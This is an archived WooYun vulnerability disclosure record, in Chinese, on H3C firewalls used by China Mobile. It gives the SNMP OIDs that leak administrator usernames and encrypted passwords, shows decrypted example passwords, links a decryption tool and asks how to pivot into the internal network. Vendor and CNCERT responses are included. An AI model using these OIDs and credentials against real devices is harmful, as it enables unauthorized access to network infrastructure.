{"id": 9810, "wybug_id": "wooyun-2013-032456", "wybug_title": "中国移动H3C防火墙侧漏利用snmp获取管理员密码成功登录设备", "wybug_corp": "中国移动", "wybug_author": "路人甲", "wybug_date": "2013-07-26 18:57", "wybug_open_date": "2013-09-09 18:58", "wybug_type": "系统/服务补丁不及时", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-09：\t细节向公众公开  简要描述： 管理员用户名和密码可以通过snmp读取，从而获得管理权限。h3c的私有mib有两种，一种是2011（huawei h3c),一种是25506（hh3c)。经过测试发现，有些设备只支持一种。如果一种获取不到数据，可以两种都尝试下。相关的oid为：  详细说明：  1.3.6.1.4.1.2011.10.2.12.1.1.1.1.1 h3cUserName OCTET-STRING admin1.3.6.1.4.1.2011.10.2.12.1.1.1.1.2 h3cUserName OCTET-STRING h3c1.3.6.1.4.1.2011.10.2.12.1.1.1.1.3 h3cUserName OCTET-STRING pppoe1.3.6.1.4.1.2011.10.2.12.1.1.1.2.1 h3cUserPassword OCTET-STRING .]@USE=B,53Q=^Q`MAF4<1!!1.3.6.1.4.1.2011.10.2.12.1.1.1.2.2 h3cUserPassword OCTET-STRING test1.3.6.1.4.1.2011.10.2.12.1.1.1.2.3 h3cUserPassword OCTET-STRING pppoe1.3.6.1.4.1.2011.10.2.12.1.1.1.1.1为用户名， 如果有多个用户则最后一位依次为2,3... 1.3.6.1.4.1.2011.10.2.12.1.1.1.2.1为第一个用户的密码，以此类推。 后面还有一些oid可以获取用户用户是否有管理权限等。需要详细研究的话可以walk一下看看。    漏洞证明：  25506 相关的oid为： 1.3.6.1.4.1.25506.2.12.1.1.1.1.1 h3c1.3.6.1.4.1.25506.2.12.1.1.1.2.1 P.KG0>5&YV3;5#)%#Z[VS1!!1.3.6.1.4.1.25506.2.12.1.1.1.3.1 71.3.6.1.4.1.25506.2.12.1.1.1.4.1 31.3.6.1.4.1.25506.2.12.1.1.1.5.1 01.3.6.1.4.1.25506.2.12.1.1.1.6.1 1同样，第一个为用户名，第二个为密码。 获取到的密码是一个加密的字符串。解密工具：https://github.com/grutz/h3c-pt-tools/blob/master/hh3c_cipher.py .]@USE=B,53Q=^Q`MAF4<1!!: admin-AO7S27&QTCQ=^Q`MAF4<1!!: h3c123P.KG0>5&YV3;5#)%#Z[VS1!!: Zjyd_h3c_10如上，可以直接得到明文的密码。然后就可以在web登录了。 后续渗透，求讨论。获取了防火墙的管理权限，如果继续渗透内网。～～～可以ssh开ssh连上去，不知道有木有抓包，转发流量的命令啊。    修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2013-07-30 22:01 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-26 20:42 |    \t\tDM_ \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:15        )\t\t \n  关注一下。    \n     2013-07-26 22:25 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  怎么标题好像见过？    \n     2013-07-26 23:17 |    \t\tHuGtion \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 学习安全技术。)\t\t \n  标题好熟悉哦    \n     2013-07-26 23:56 |    \t\t78基佬 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:20        | 不会日站的设计师不是好产品经理)\t\t \n  见过了 无耻    \n     2013-07-27 07:41 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  这标题好像在哪里见过    \n     2013-07-27 11:09 |    \t\tsdj \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:6        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n   WooYun: 中国移动H3C防火墙侧漏，利用snmp获取管理员密码，成功登录设备！  难道是这标题    \n     2013-07-29 12:34 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  请提供中移动H3C防火墙IP地址发送至vreport@cert.org.cn邮箱，以便CNVD测试复现，谢谢！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}